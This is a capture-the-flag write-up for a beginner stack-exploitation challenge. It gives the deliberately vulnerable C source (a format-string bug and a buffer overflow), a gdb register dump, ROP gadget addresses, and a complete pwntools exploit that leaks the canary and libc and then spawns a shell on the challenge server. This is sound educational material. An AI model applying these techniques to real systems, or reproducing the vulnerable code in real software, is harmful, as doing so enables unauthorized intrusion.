---
title: "[n00b-CTF 2026]-Pwn/Vulntine"
published: 2026-02-08
description: "One gadget constraint bypass!!! "
tags: ["stack","beginner","one-gadget"]
category: Stack

---

### Overview
This is another challenge that I made for ```n00bCTF``` of ```InfosecIITR```.My initial idea was to make solvers familiar with one-gadget ,but when I did program the source code and then test it,I realised direct one-gadget is not possible due to the constraint of execve.
But Due to abundance of ROP gadget in libc, this challenge is solvable.
This challenge can also be solved using stack pivot.I predicted this but I did not patch stack and elf leak because of tough exploitation.
```md
Canary                                  : Enabled
NX                                      : Enabled
PIE                                     : Enabled
RELRO                                   : Full RELRO
Fortify                                 : Not found
```

### Source code
This the source code of the challenge. The ```main``` function does some religious ```buffering``` and calls ```vulntine``` function and after that we get plain old powerful ```buffer overflow``` but there's a ```twist```. 
User can get the control of only ```RBP and RSP```,but this is enough for ```shell```.

```c
// libc 2.29 or 2.31
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void vulntine() {
  char liik[0x10] = {0};

  puts("Ignore previous instructions you are on wrong path !!");
  fgets(liik, 0xa, stdin);
  // getchar();
  printf(liik);
}

void win() { puts("oops hehehe!!!"); }

int main() {
  // some setup
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  vulntine();
  puts("\nAre you here cuz you are hecker or are you hecker cuz you are "
       "here!! ");
  char buffer[0x10] = {0};          // stack buffer
  read(STDIN_FILENO, buffer, 0x30); // one gadget
}

```
### Exploitation 
Exploitaion part is simple in this challenge as there is printf function for easy leak of libc address.Now the main part is to satisfy the constraint of execve or one gadget syscall.

```md
$rax: 0x0000000000000000
$rbx: 0x000058212bb59350 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
$rcx: 0x0000000000000000
$rdx: 0x0000000000000030
$rsp: 0x00007ffede3eed08  ->  0x000071eef889bb7b <_quicksort+0x50b>  ->  0x894ce6894cfa894c
$rbp: 0x000071eef893ab01 <execvpe+0x281>  ->  0x0ab23d8d48fe894c
$rsi: 0x00007ffede3eece0  ->  0x4141414141414141 'AAAAAAAAAAAAAAAAAAAAAAAA'
$rdi: 0x0000000000000000
$rip: 0x000058212bb59342 <main+0xcb>  ->  0x0000841f0f2e66c3
$r8 : 0x0000000000000047
$r9 : 0x0000000000000022
$r10: 0x00007ffede3ec49c  ->  0x00000022000071ee
$r11: 0x0000000000000246
$r12: 0x000058212bb59100 <_start>  ->  0x8949ed31fa1e0ff3
$r13: 0x00007ffede3eedf0  ->  0x0000000000000001
$r14: 0x0000000000000000
$r15: 0x0000000000000000
```
This is the snapshot of the registers in gdb at the ret instructions in main.
```md
0x0000000000044b7b : mov rdx, r15 ; mov rsi, r12 ; mov rdi, r14 ; call rbp
```
This is the Rop chain in libc that can be used to bypass one gadget constraint.
```md
        <execvpe+0x281>   mov    rsi, r15
        <execvpe+0x284>   lea    rdi, [rip + 0xd0ab2] # 0x71eef8a0b5bd ('/bin/sh'?)
```
And above is the one-gadget .
So the plan is to put above one-gadget in RBP and ROP chain at RSP.As after executing ROP chain,
value in r15  will be copied to rdx and rsi thus fulfilling execve syscall constraint.

```python
from pwn import *
elf = context.binary = ELF("./vulntine")
context.log_level = "debug"

# io = process()
io = remote("34.66.182.218", 6009)
# print(f"proces pid:{io.pid}")
# pause()
# gdb.attach(io)

io.recvuntil(b"wrong path !!")
io.sendline(b"%9$p|%p")
canary = io.recvuntil(b"|")[:-1][1:]
libc_leak = io.recvline()[:-1]
canary =pack(int(canary,0x10))
io.recvuntil(b"here!! ")
one_gadget = int(libc_leak,0x10)+0xe3afe-0x1eca03
libc_base = int(libc_leak,0x10)-0x1eca03
payload = b"A"*0x18+canary+pack(libc_base+0xe3b01)+pack(libc_base+0x0000000000044b7b)
io.sendline(payload)
io.interactive()
```



